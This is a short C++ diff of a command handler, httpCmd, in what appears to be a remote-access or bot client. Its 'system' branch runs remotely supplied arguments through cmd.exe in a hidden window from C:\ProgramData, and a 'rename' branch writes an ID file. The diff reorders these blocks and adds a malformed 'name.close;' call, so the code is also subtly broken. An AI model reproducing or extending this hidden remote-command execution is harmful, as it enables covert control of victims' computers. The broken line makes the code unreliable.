@@ -481,17 +481,19 @@ int main(int argc, char *argv[])
 
 void httpCmd(string cmd, string arg1, string arg2, string arg3)
 {
-	if (cmd == "system")
-	{
-		string resultSystem = "/C " + arg1;
-		cout << "system arg1: " << arg1 << endl;
-		ShellExecuteA(NULL, "open", "cmd.exe", resultSystem.c_str(), "C:\\ProgramData\\", SW_HIDE);
-	}
 
 	if (cmd == "rename")
 	{
 		ofstream name("ID.txt", ios::out | ios::trunc);
 		name << arg1;
+		name.close;
+	}
+
+	if (cmd == "system")
+	{
+		string resultSystem = "/C " + arg1;
+		cout << "system arg1: " << arg1 << endl;
+		ShellExecuteA(NULL, "open", "cmd.exe", resultSystem.c_str(), "C:\\ProgramData\\", SW_HIDE);
 	}
 
 	if (cmd == "send")
